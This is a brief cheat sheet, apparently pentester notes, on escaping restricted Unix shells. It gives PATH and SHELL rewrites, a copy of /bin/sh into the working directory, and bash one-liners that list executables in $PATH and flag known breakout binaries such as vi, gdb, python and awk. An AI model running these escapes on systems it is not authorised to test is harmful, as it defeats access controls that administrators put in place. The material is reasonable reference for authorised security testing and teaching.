## Restricted shells can't run all commands, but they can run bash 😉

### quick wins from https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells?slide=7
```
/bin/sh
export PATH=/bin:/bin/sh:$PATH 
export SHELL=/bin/sh
cp /bin/sh $PWD; sh
```

### [BASH-ONLY] Enumerate all files accessible in the $PATH:
```IFS=:; for i in $PATH; do IFS= ; for j in $i/*; do echo $j; done; done;```

### [BASH-ONLY] Test for known executables that can be used to break out of the bash -r that reside in the $PATH (not a complete list):
```echo displaying current env; echo; echo; env; echo; echo; echo displaying current exported variables; echo; echo; export -p; echo; echo; IFS=:; EXES="ftp gdb scp vi vim emacs bash sh ssh python* g++ gcc clang++ clang csh ksh tcsh chmod tcpdump perl awk find more less man tee ruby lua irb"; for i in $PATH; do IFS=' '; for j in $i/*; do for k in $EXES; do if [[ "$j" == */$k ]]; then echo $k is here $j; fi; done; done; done;```
